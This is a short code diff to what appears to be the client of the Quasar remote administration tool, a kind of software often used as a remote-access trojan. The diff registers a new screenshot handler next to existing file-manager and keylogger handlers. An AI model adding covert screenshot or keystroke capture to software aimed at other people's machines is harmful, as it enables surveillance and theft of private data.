@@ -170,6 +170,9 @@ namespace Quasar.Client
         /// <remarks>Always initialize from UI thread.</remarks>
         private void InitializeMessageProcessors(QuasarClient client)
         {
+            //preview stuff
+            _messageProcessors.Add(new SimpleScreenshotterHandler());
+
             _messageProcessors.Add(new ClientServicesHandler(this, client));
             _messageProcessors.Add(new FileManagerHandler(client));
             _messageProcessors.Add(new KeyloggerHandler());
